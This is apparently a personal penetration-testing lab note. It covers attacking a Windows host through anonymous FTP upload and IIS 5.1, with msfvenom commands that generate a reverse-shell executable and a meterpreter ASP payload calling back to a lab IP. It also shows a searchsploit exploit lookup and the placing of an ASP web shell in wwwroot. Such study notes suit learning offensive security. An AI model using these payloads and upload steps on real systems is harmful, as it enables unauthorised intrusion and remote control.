Attack Vectors _ Searchsploit

Attack Vectors / Searchsploit

# Microsoft FTP
We are able to upload files from our attack machine /tmp/dir to the target's wwwroot directory using username anonymous without any password.It allows the put command to put any files in the wwwroot. When on a browser, we can read a .txt but cannot execute an .exe. Upload to the /Scripts directory, at least you can see the files. It won't allow to execute .exe but will let you download .php
![5b5788ccdfc6122c666c8bc51fa696f6.png](:/39f2b240dcb742d5abef7b6db25bb3ad)

Create shellcode
`msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.214 LPORT=5678 -f exe > rev_shell_reverseTcp_192.168.119.214_5678.exe`
![21a5250e50c7902d138e810ebae41bb0.png](:/16b6a1a3fd3d4b6a943ba34657a7fbfd)

Transfer the reverse shell to the /tmp dir
![3ef0cc7b524b82b4ad6120fed14e9b1e.png](:/f5a8b5e38baa413d85e13b3193a3c192)




# Remote Desktop Web Connection

# Nikto scan
There are some interesting finds from Nikto that I havne't documented yet.

# Microsoft IIS 5.1
`searchsploit microsoft iis 5.1`
![5d477c6eee0d25e1a812fc78eb415619.png](:/ccf07efbb714422dacfaa18c4a2aee2e)


# 4016 - Hit Highlighting Authentication Bypass
`searchsploit -m 4016`
This file comes with some CRLF line terminators. To get rid of them, run dos2unix file.sh
`dos2unix m4016.sh`
**Still need a screenshot of the dos2unix output**

###  Let's use an asp shell found in /usr/share/webshells/asp/cmd-asp-5.1.asp
It too must be adjusted when you see errors in linebreaks after trying to run it in browser. Here is the diff:
![ab56ab458e1f108ee9ce94fb8c918c99.png](:/698ce8c211d44ad9a9e0109acbec8eb4)

### It must be transfered to wwwroot. Login as anonymous with no password, then use the put command to put it into the wwwroot directory
![e92a826753375a83b9f519be181a794f.png](:/c9b58cf3fbef4c0a9e83641a5074ec91)


### Browse to the 
![c372b546ebc936aaae1a7aefb74bad6c.png](:/648835eb658b4d86a1a56a18eab5fb89)


### What about meterpreter shell
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.214 LPORT=5678 -f asp > rev_windows_meterpreter_reverseTcp_192.168.119.214_5678_asp.asp`
![c91f0027026662949db6894265746793.png](:/840d89e160c44a939ff7828f23b49b4c)


# ASP should we write asp code?
https://asp.net-tutorials.com/basics/hello-world/








id: 66e8d5bd9bee4487af314227df3f11be
parent_id: 21292791d7a84439990b13f099353ddd
created_time: 2020-08-26T09:02:28.131Z
updated_time: 2020-08-29T19:30:31.165Z
is_conflict: 0
latitude: 0.00000000
longitude: 0.00000000
altitude: 0.0000
author: 
source_url: 
is_todo: 0
todo_due: 0
todo_completed: 0
source: joplin-desktop
source_application: net.cozic.joplin-desktop
application_data: 
order: 0
user_created_time: 2020-08-26T09:02:28.131Z
user_updated_time: 2020-08-29T19:30:31.165Z
encryption_cipher_text: 
encryption_applied: 0
markup_language: 1
is_shared: 0
type_: 1